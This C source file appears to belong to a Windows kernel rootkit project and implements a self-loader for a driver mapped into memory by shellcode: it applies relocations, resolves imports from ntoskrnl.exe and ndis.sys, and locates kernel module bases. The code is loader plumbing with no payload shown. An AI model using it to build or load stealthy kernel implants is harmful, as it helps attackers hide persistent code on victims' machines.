#include "stdafx.h"
#include "../common/shellcode2_struct.h"

#pragma alloc_text(INIT, my_strlen)
#pragma alloc_text(INIT, my_strcmp)
#pragma alloc_text(INIT, my_strcpy)
#pragma alloc_text(INIT, my_strlwr)
#pragma alloc_text(INIT, chrlwr_w)
#pragma alloc_text(INIT, EqualUnicodeString_r)
#pragma alloc_text(INIT, RuntimeGetExportAddress)
#pragma alloc_text(INIT, RuntimeGetKernelModuleBase)
#pragma alloc_text(INIT, RuntimeProcessImports)
#pragma alloc_text(INIT, RuntimeInitialize)

#define MAX_IMAGE_NAME_LEN 255

PVOID m_KernelBase = NULL, m_DriverBase = NULL;
//--------------------------------------------------------------------------------------
/**
 * Implementations of some standard C library functions.
 */

size_t my_strlen(const char *str)
{
    if (str)
    {
        size_t i = 0;

        for (; str[i] != NULL; i++);

        return i;        
    }

    return 0;
}

int my_strcmp(const char *str_1, const char *str_2)
{
    size_t len_1 = my_strlen(str_1), len_2 = my_strlen(str_2);

    if (len_1 != len_2)
    {
        return 1;
    }

    for (size_t i = 0; i < len_1; i++)
    {
        if (str_1[i] != str_2[i])
        {
            return 1;
        }
    }

    return 0;
}

char *my_strcpy(char *str_1, const char *str_2)
{
    size_t len = my_strlen(str_2) + 1;

    for (size_t i = 0; i < len; i++)
    {
        str_1[i] = str_2[i];
    }

    return str_1;
}

char *my_strlwr(char *str)
{
    char *pos = str;

    for (; str <= (pos + my_strlen(pos)); str++)
    {		
        if ((*str >= 'A') && (*str <= 'Z')) 
        {
            *str = *str + ('a'-'A');
        }
    }

    return pos;
}
//--------------------------------------------------------------------------------------
wchar_t chrlwr_w(wchar_t chr)
{
    if ((chr >= 'A') && (chr <= 'Z')) 
    {
        return chr + ('a'-'A');
    }

    return chr;
}

BOOLEAN EqualUnicodeString_r(PUNICODE_STRING Str1, PUNICODE_STRING Str2, BOOLEAN CaseInSensitive)
{
    USHORT CmpLen = min(Str1->Length, Str2->Length) / sizeof(WCHAR);

    // compare unicode strings from the end of the buffers
    for (USHORT i = 1; i < CmpLen; i++)
    {
        WCHAR Chr1 = Str1->Buffer[Str1->Length / sizeof(WCHAR) - i], 
              Chr2 = Str2->Buffer[Str2->Length / sizeof(WCHAR) - i];

        if (CaseInSensitive)
        {
            Chr1 = chrlwr_w(Chr1);
            Chr2 = chrlwr_w(Chr2);
        }

        if (Chr1 != Chr2)
        {
            return FALSE;
        }
    }

    return TRUE;
}
//--------------------------------------------------------------------------------------
PVOID RuntimeGetExportAddress(PVOID Image, char *lpszFunctionName)
{
    PIMAGE_EXPORT_DIRECTORY pExport = NULL;

    PIMAGE_NT_HEADERS32 pHeaders32 = (PIMAGE_NT_HEADERS32)
        ((PUCHAR)Image + ((PIMAGE_DOS_HEADER)Image)->e_lfanew);

    if (pHeaders32->FileHeader.Machine == IMAGE_FILE_MACHINE_I386)
    {
        // 32-bit image
        if (pHeaders32->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress)
        {
            pExport = (PIMAGE_EXPORT_DIRECTORY)RVATOVA(Image,
                pHeaders32->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
        }                        
    }        
    else if (pHeaders32->FileHeader.Machine == IMAGE_FILE_MACHINE_AMD64)
    {
        // 64-bit image
        PIMAGE_NT_HEADERS64 pHeaders64 = (PIMAGE_NT_HEADERS64)
            ((PUCHAR)Image + ((PIMAGE_DOS_HEADER)Image)->e_lfanew);

        if (pHeaders64->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress)
        {
            pExport = (PIMAGE_EXPORT_DIRECTORY)RVATOVA(Image,
                pHeaders64->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
        }
    }
    else
    {
        return NULL;
    }

    if (pExport)
    {
        PULONG AddressOfFunctions = (PULONG)RVATOVA(Image, pExport->AddressOfFunctions);
        PSHORT AddrOfOrdinals = (PSHORT)RVATOVA(Image, pExport->AddressOfNameOrdinals);
        PULONG AddressOfNames = (PULONG)RVATOVA(Image, pExport->AddressOfNames);

        // enumerate exports
        for (ULONG i = 0; i < pExport->NumberOfFunctions; i++)
        {
            if (!my_strcmp((char *)RVATOVA(Image, AddressOfNames[i]), lpszFunctionName))
            {
                return RVATOVA(Image, AddressOfFunctions[AddrOfOrdinals[i]]);
            }
        }
    }        

    return NULL;
}
//--------------------------------------------------------------------------------------
BOOLEAN RuntimeProcessImports(PVOID Image, char *ImportedModuleName, PVOID ImportedModuleBase)
{    
    PIMAGE_NT_HEADERS32 pHeaders32 = (PIMAGE_NT_HEADERS32)
        ((PUCHAR)Image + ((PIMAGE_DOS_HEADER)Image)->e_lfanew);

    PIMAGE_IMPORT_DESCRIPTOR pImport = NULL;

    if (pHeaders32->FileHeader.Machine == IMAGE_FILE_MACHINE_I386)
    {
        // 32-bit image
        if (pHeaders32->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress)
        {
            pImport = (PIMAGE_IMPORT_DESCRIPTOR)RVATOVA(Image,
                pHeaders32->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
        }
    }        
    else if (pHeaders32->FileHeader.Machine == IMAGE_FILE_MACHINE_AMD64)
    {
        // 64-bit image
        PIMAGE_NT_HEADERS64 pHeaders64 = (PIMAGE_NT_HEADERS64)
            ((PUCHAR)Image + ((PIMAGE_DOS_HEADER)Image)->e_lfanew);

        if (pHeaders64->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress)
        {
            pImport = (PIMAGE_IMPORT_DESCRIPTOR)RVATOVA(Image,
                pHeaders64->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
        }
    }
    else
    {
        return FALSE;
    }

    if (pImport)
    {
        // enumerate import modules
        while (pImport->Name != 0)
        {
            char szName[MAX_IMAGE_NAME_LEN];
            my_strcpy(szName, (char *)RVATOVA(Image, pImport->Name));
            
            if (my_strcmp(my_strlwr(szName), ImportedModuleName))
            {
                // this routine can process only exports from the specified module
                goto skip_module;
            }

#ifdef _X86_
            
            // process thunk data for 32-bit pointers
            PIMAGE_THUNK_DATA32 pThunk = (PIMAGE_THUNK_DATA32)RVATOVA(Image, pImport->FirstThunk);

#elif _AMD64_ 

            // process thunk data for 64-bit pointers
            PIMAGE_THUNK_DATA64 pThunk = (PIMAGE_THUNK_DATA64)RVATOVA(Image, pImport->FirstThunk);
#endif
            // enumerate functions of the current module
            while (pThunk->u1.Ordinal != 0)
            {
                PIMAGE_IMPORT_BY_NAME pName = (PIMAGE_IMPORT_BY_NAME)RVATOVA(Image, pThunk->u1.AddressOfData);
                char *lpszFuncName = (char *)&pName->Name;
                
                PVOID FuncAddr = RuntimeGetExportAddress(ImportedModuleBase, lpszFuncName);
                if (FuncAddr == NULL)
                {
                    return FALSE;
                }

                *(PVOID *)pThunk = FuncAddr;
                pThunk += 1;
            }

skip_module:

            pImport += 1;
        }
    }    

    return TRUE;
}
//--------------------------------------------------------------------------------------
BOOLEAN RuntimeProcessRelocs(PVOID Image, PVOID NewBase)
{
    PIMAGE_NT_HEADERS32 pHeaders32 = (PIMAGE_NT_HEADERS32)
        ((PUCHAR)Image + ((PIMAGE_DOS_HEADER)Image)->e_lfanew);

    PIMAGE_BASE_RELOCATION pRelocation = NULL;
    ULONG RelocationSize = 0;        
    ULONGLONG OldBase = 0;

    if (pHeaders32->FileHeader.Machine == IMAGE_FILE_MACHINE_I386)
    {
        // 32-bit image
        if (pHeaders32->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress)
        {
            pRelocation = (PIMAGE_BASE_RELOCATION)RVATOVA(Image,
                pHeaders32->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
            RelocationSize = pHeaders32->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
        }

        OldBase = pHeaders32->OptionalHeader.ImageBase;
    }        
    else if (pHeaders32->FileHeader.Machine == IMAGE_FILE_MACHINE_AMD64)
    {
        // 64-bit image
        PIMAGE_NT_HEADERS64 pHeaders64 = (PIMAGE_NT_HEADERS64)
            ((PUCHAR)Image + ((PIMAGE_DOS_HEADER)Image)->e_lfanew);

        if (pHeaders64->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress)
        {
            pRelocation = (PIMAGE_BASE_RELOCATION)RVATOVA(Image,
                pHeaders64->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
            RelocationSize = pHeaders64->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
        }

        OldBase = pHeaders64->OptionalHeader.ImageBase;
    }
    else
    {
        return FALSE;
    }

    if (pRelocation)
    {
        ULONG Size = 0;

        // enumerate relocation pages
        while (RelocationSize > Size && pRelocation->SizeOfBlock)
        {            
            ULONG Number = (pRelocation->SizeOfBlock - 8) / 2;
            PUSHORT Rel = (PUSHORT)((PUCHAR)pRelocation + 8);            

            // enumerate relocation offsets for the current page
            for (ULONG i = 0; i < Number; i++)
            {
                if (Rel[i] > 0)
                {
                    USHORT Type = (Rel[i] & 0xF000) >> 12;

                    // check for supporting type
                    if (Type != IMAGE_REL_BASED_HIGHLOW &&
                        Type != IMAGE_REL_BASED_DIR64)
                    {
                        return FALSE;
                    }
#ifdef _X86_
                    *(PULONG)(RVATOVA(Image, pRelocation->VirtualAddress + 
                        (Rel[i] & 0x0FFF))) += (ULONG)((ULONGLONG)NewBase - OldBase);
#elif _AMD64_
                    *(PULONGLONG)(RVATOVA(Image, pRelocation->VirtualAddress + 
                        (Rel[i] & 0x0FFF))) += (ULONGLONG)NewBase - OldBase;
#endif
                }
            }

            pRelocation = (PIMAGE_BASE_RELOCATION)((PUCHAR)pRelocation + pRelocation->SizeOfBlock);
            Size += pRelocation->SizeOfBlock;            
        }
    }

    return TRUE;
}
//--------------------------------------------------------------------------------------
PVOID RuntimeGetSystemInformation(SYSTEM_INFORMATION_CLASS InfoClass)
{
    NTSTATUS ns = STATUS_SUCCESS;
    ULONG Size = 0x100;
    PVOID Info = NULL;

    while (true) 
    {    
        // allocate memory for the system information
        if ((Info = ExAllocatePool(NonPagedPool, Size)) == NULL) 
        {
            DbgMsg("ExAllocatePool() fails\n");
            return NULL;
        }

        ULONG RetSize = 0;
        ns = ZwQuerySystemInformation(InfoClass, Info, Size, &RetSize);
        if (ns == STATUS_INFO_LENGTH_MISMATCH)
        {       
            ExFreePool(Info);
            Info = NULL;

            if (RetSize > 0)
            {
                // need more memory
                Size = RetSize + 0x100;
            }            
            else
            {
                break;
            }
        }
        else
        {
            break;    
        }
    }

    if (!NT_SUCCESS(ns))
    {
        DbgMsg("ZwQuerySystemInformation() fails; status: 0x%.8x\n", ns);

        if (Info)
        {
            // cleanup on error
            ExFreePool(Info);
        }

        return NULL;
    }

    return Info;
}
//--------------------------------------------------------------------------------------
PVOID RuntimeGetKernelModuleBase(char *ModuleName)
{
    PVOID pModuleBase = NULL;
    UNICODE_STRING usCommonHalName, usCommonNtName;

    RtlInitUnicodeString(&usCommonHalName, L"hal.dll");
    RtlInitUnicodeString(&usCommonNtName, L"ntoskrnl.exe");

    #define HAL_NAMES_NUM 6
    wchar_t *wcHalNames[] = 
    {
        L"hal.dll",      // Non-ACPI PIC HAL 
        L"halacpi.dll",  // ACPI PIC HAL
        L"halapic.dll",  // Non-ACPI APIC UP HAL
        L"halmps.dll",   // Non-ACPI APIC MP HAL
        L"halaacpi.dll", // ACPI APIC UP HAL
        L"halmacpi.dll"  // ACPI APIC MP HAL
    };

    #define NT_NAMES_NUM 4
    wchar_t *wcNtNames[] = 
    {
        L"ntoskrnl.exe", // UP
        L"ntkrnlpa.exe", // UP PAE
        L"ntkrnlmp.exe", // MP
        L"ntkrpamp.exe"  // MP PAE
    };

    PRTL_PROCESS_MODULES Info = (PRTL_PROCESS_MODULES)RuntimeGetSystemInformation(SystemModuleInformation);
    if (Info)
    {
        ANSI_STRING asModuleName;
        UNICODE_STRING usModuleName;

        RtlInitAnsiString(&asModuleName, ModuleName);

        NTSTATUS ns = RtlAnsiStringToUnicodeString(&usModuleName, &asModuleName, TRUE);
        if (NT_SUCCESS(ns))
        {
            for (ULONG i = 0; i < Info->NumberOfModules; i++)
            {
                ANSI_STRING asEnumModuleName;
                UNICODE_STRING usEnumModuleName;

                RtlInitAnsiString(
                    &asEnumModuleName, 
                    (char *)Info->Modules[i].FullPathName + Info->Modules[i].OffsetToFileName
                );

                NTSTATUS ns = RtlAnsiStringToUnicodeString(&usEnumModuleName, &asEnumModuleName, TRUE);
                if (NT_SUCCESS(ns))
                {                    
                    if (RtlEqualUnicodeString(&usModuleName, &usCommonHalName, TRUE))
                    {
                        // hal.dll passed as module name
                        for (int i_m = 0; i_m < HAL_NAMES_NUM; i_m++)
                        {
                            UNICODE_STRING usHalName;
                            RtlInitUnicodeString(&usHalName, wcHalNames[i_m]);

                            // compare module name from list with known HAL module name
                            if (RtlEqualUnicodeString(&usEnumModuleName, &usHalName, TRUE))
                            {
                                pModuleBase = (PVOID)Info->Modules[i].ImageBase;
                                break;
                            }
                        }
                    }
                    else if (RtlEqualUnicodeString(&usModuleName, &usCommonNtName, TRUE))
                    {
                        // ntoskrnl.exe passed as module name
                        for (int i_m = 0; i_m < NT_NAMES_NUM; i_m++)
                        {
                            UNICODE_STRING usNtName;
                            RtlInitUnicodeString(&usNtName, wcNtNames[i_m]);

                            // compare module name from list with known kernel module name
                            if (RtlEqualUnicodeString(&usEnumModuleName, &usNtName, TRUE))
                            {
                                pModuleBase = (PVOID)Info->Modules[i].ImageBase;
                                break;
                            }
                        }
                    }
                    else if (RtlEqualUnicodeString(&usModuleName, &usEnumModuleName, TRUE))
                    {
                        pModuleBase = (PVOID)Info->Modules[i].ImageBase;
                    }

                    RtlFreeUnicodeString(&usEnumModuleName);

                    if (pModuleBase)
                    {
                        // module is found
                        break;
                    }
                }                    
            }                     

            RtlFreeUnicodeString(&usModuleName);
        }        

        ExFreePool(Info);
    }

    return pModuleBase;
}
//--------------------------------------------------------------------------------------
BOOLEAN RuntimeInitialize(
    PDRIVER_OBJECT DriverObject,
    PUNICODE_STRING RegistryPath)
{
    if (DriverObject == NULL)
    {
        /**
         * Driver has been loaded by shellcode.
         * RegistryPath - pointer to the SC_PARAMS
         */

        PSC_PARAMS ShellcodeParams = (PSC_PARAMS)RegistryPath;        

        // parse image relocations
        if (!RuntimeProcessRelocs(
            ShellcodeParams->rootkit_base, 
            ShellcodeParams->rootkit_base))
        {
            return FALSE;
        }

        /*
            Safe to use global variables here.
        */

        m_KernelBase = ShellcodeParams->kernel_base;
        m_DriverBase = ShellcodeParams->rootkit_base;        

        // parse image imports (kernel)            
        if (!RuntimeProcessImports(
            ShellcodeParams->rootkit_base,
            "ntoskrnl.exe", ShellcodeParams->kernel_base))
        {
            return FALSE;
        }

        /*
            Safe to use kernel imports here.
        */

        DbgMsg(__FUNCTION__"(): Kernel base is "IFMT"\n", m_KernelBase);

        PVOID NdisBase = RuntimeGetKernelModuleBase("ndis.sys");
        if (NdisBase)
        {
            DbgMsg(__FUNCTION__"(): NDIS base is "IFMT"\n", NdisBase);

            // parse image imports (NDIS)
            if (!RuntimeProcessImports(
                ShellcodeParams->rootkit_base,
                "ndis.sys", NdisBase))
            {
                return FALSE;
            }
        }        
        else
        {
            DbgMsg(__FUNCTION__"() ERROR: Unable to locate NDIS\n");
            return FALSE;
        }

        /*
            Safe to use all others imports here.
        */
    }

    // driver has been loaded as usual
    return TRUE;
}
//--------------------------------------------------------------------------------------
// EoF

